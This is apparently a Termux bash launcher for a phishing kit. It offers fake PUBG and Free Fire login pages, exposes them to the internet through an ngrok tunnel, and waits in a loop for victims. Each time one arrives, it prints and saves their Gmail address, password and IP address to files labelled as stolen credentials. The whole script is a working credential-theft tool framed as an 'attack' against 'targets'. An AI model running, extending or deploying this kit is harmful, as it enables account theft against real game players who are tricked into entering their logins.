ngrok(){
cd $HOME
echo -e "\e[91m \t\t PLEASE ON MOBILE HOTSPOT "
sleep 5.0
echo -e "\e[92m\n\t\t LOCALHOST STARTING... "
sleep 2.0
echo -e "\e[92m \n\t\t NGROK STARTING... "

./ngrok http 8080 > /dev/null 2>1&
sleep 5.0

bash joker/link.sh
echo -e "\e[96m \n \tLOCALHOST : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃  \t\t127.0.0.1:8080                   "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[96m \n \tNGROK LINK : "
echo -e "\e[94m                 ┃"
echo -e "\e[94m                 ┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e " $(cat link.txt)"

echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

}



clear
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |------------------CHOOSE ATTACK----------------------|"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |       [\e[92m1\e[96m]==> PUBG                       |"
echo -e "\e[96m        |       [\e[92m2\e[96m]==> FREE FIRE                  |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |    NOTE : - PASSWORDS SAVE IN 'www' DIRECTORY       |"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |--------------CHOOSE A OPTION------------------------|"
echo -e "\e[96m        |                                                     |"
echo -e "\e[96m        |=====================================================|"
 
echo -e "\n"
read -p " CHOOSE A GAME :  " pubg
case $pubg in 
1)

cd .sites/pubg/notp
bash local.sh

ngrok
cd /storage/emulated/0/sukhdevr898/Project/loction/.sites/pubg/notp
while true;

do
if [ -e gmail.txt ];
then
mpv $HOME/joker/cap.mp3 > /dev/null 2>1&
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\n"
echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
echo -e "\e[94m\n┃-------  $IP  -------┃"

echo -e "\n"
echo -e "\e[98m \n\tGMAIL :  $(cat gmail.txt)  "
cat gmail.txt >> $HOME/joker/www/pubg.txt
rm gmail.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m\n\tPASSWORD :  $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/pubgpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
;;
2)
cd .sites/freefire/notp
bash local.sh
ngrok
cd .sites/freefire/notp
while true;

do
if [ -e gmail.txt ];
then
mpv $HOME/joker/cap.mp3 > /dev/null 2>1&
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "

echo -e "\e[94m┃---------SOMEONE OPEN THE LINK---------┃"
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
echo -e "\n"
echo -e "\e[94m\n┃---------VICTIM'S IP FOUND---------┃"
echo -e "\e[94m\n┃-------  $IP  -------┃"
echo -e "\n"
echo -e "\e[98m $(cat gmail.txt)  "
cat gmail.txt >> $HOME/joker/www/ff.txt
rm gmail.txt
fi
if [ -e pass.txt ];
then
echo -e "\e[98m $(cat pass.txt)  "
cat pass.txt >> $HOME/joker/www/ffpass.txt
rm pass.txt
echo -e "\e[99m\n\t\t PRESS CTRL+C FOR EXIT...."
echo -e "\e[98m \n\n\t\t WAITING FOR NEXT TARGET... "
echo -e "\e[94m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ "
fi
done
::
esac


HOST='127.0.0.1'
PORT='8080'
ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
